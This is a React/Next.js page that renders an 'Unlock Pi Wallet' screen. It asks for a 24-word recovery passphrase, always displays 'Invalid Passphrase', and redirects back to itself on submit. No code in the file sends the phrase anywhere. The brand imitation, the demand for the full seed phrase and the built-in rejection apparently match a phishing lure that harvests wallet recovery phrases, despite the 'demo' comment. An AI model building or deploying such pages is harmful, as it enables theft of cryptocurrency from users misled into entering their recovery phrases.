"use client"

import { useState } from "react"
import { WalletHeader } from "@/components/wallet/wallet-header"
import { WalletInfo } from "@/components/wallet/wallet-info"
import { FooterNav } from "@/components/wallet/footer-nav"
import { useRouter } from "next/navigation"

export default function InvalidPassphrasePage() {
  const router = useRouter()
  const [passphrase, setPassphrase] = useState("")

  const handleUnlock = () => {
    // In a real app, this would validate against a backend
    // For demo purposes, we'll just redirect back to this page
    router.push("/invalid-passphrase")
  }

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <WalletHeader />

      <main className="flex-1 w-full max-w-md mx-auto p-6 flex flex-col items-center">
        <h1 className="text-2xl font-bold mb-8 mt-4">Unlock Pi Wallet</h1>

        <form className="w-full space-y-6">
          <div className="w-full">
            <textarea
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              placeholder="Enter your 24-word passphrase here"
              className="min-h-[200px] w-full border border-gray-300 rounded-md p-4 text-gray-600 resize-none"
            />
            <p className="mt-2 text-center text-[#e76f51]">Invalid Passphrase</p>
          </div>

          <button
            type="button"
            onClick={handleUnlock}
            className="w-full bg-[#7b2cbf] hover:bg-[#6a24a6] text-white py-4 rounded-md font-medium"
          >
            Unlock With Passphrase
          </button>
        </form>

        <WalletInfo />
      </main>

      <FooterNav />
    </div>
  )
}

